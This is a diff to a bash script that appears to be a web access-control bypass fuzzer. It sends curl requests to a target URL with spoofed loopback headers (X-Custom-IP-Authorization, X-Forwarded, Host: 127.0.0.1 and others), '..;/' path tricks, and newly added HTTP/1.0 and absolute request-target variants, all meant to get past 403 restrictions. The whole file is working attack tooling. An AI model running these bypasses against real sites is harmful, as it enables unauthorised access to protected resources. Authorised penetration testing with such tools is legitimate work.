@@ -16,7 +16,7 @@ GREEN="\e[1m\e[32m"
 YELLOW="\e[1m\e[33m"
 CLEAR="\e[0m"
 
-METHOD="-XGET" # default is GET
+METHOD="GET" # default is GET
 TIMEOUT=-m"0" # TIMEOUT="-m 2"
 COOKIE="" 
 # COOKIE="Cookie: a=b"
@@ -65,7 +65,7 @@ fi
 DIR=${DIR#/}
 
 function curl_wapper(){
-	curl -k -s -o /dev/null --path-as-is -w "%{http_code}","%{size_download}" -H "$COOKIE" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
+	curl -k -s -o /dev/null --path-as-is -w "%{http_code}","%{size_download}" -H "$COOKIE" "$USER_AGENT" "$TIMEOUT" $REDIRECT -X"$METHOD" "$@"
 }
 # https://www.baidu.com/dir1<payload>
 function payload_Suffux(){
@@ -165,13 +165,14 @@ function payload_Header(){
 	FULL_URL=$1
 	fqdn_url=${FULL_URL%%//*}//$(echo ${FULL_URL}|cut -d'/' -f 3)/
 	tmp=${FULL_URL#*//}
-	rewrite_url=${tmp#*/}
+	rewrite_url=""
 	# https://www.baidu.com/a/b/c/d
 	# $1(FULL_URL): https://www.baidu.com/a/b/c/d
 	# fqdn_url: https://www.baidu.com/
 	# rewrite_url: a/b/c/d
 	if [[ x$(echo ${FULL_URL}|cut -d '/' -f4) != x ]]; then
 		# fix https://www.baidu.com..;/
+		rewrite_url=${tmp#*/}
 		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
 	fi
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL) &
@@ -189,7 +190,7 @@ function payload_Header(){
 	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL) &
 	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL) &
 	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL) &
-	output "too many header one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
+	output "too many headers one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
 													-H "Request-Uri: /$rewrite_url" \
 													-H "X-Forwarded: 127.0.0.1" \
 													-H "X-Forwarded-By: 127.0.0.1" \
@@ -213,6 +214,11 @@ function payload_Header(){
 													-H "X-Proxy-Url: http://127.0.0.1/$rewrite_url" \
 													-H "X-Real-Ip: 127.0.0.1" \
 													$FULL_URL) &
+	wait
+
+	output "${METHOD} /${rewrite_url} HTTP/1.0" $(curl_wapper --http1.0 $FULL_URL) &
+	output "${METHOD} ${FULL_URL} HTTP/1.1 \t Host: 127.0.0.1" $(curl_wapper -H "Host: 127.0.0.1" --request-target  "${FULL_URL}" $FULL_URL) &
+	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.1" $(curl_wapper --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
 	wait
 }
 
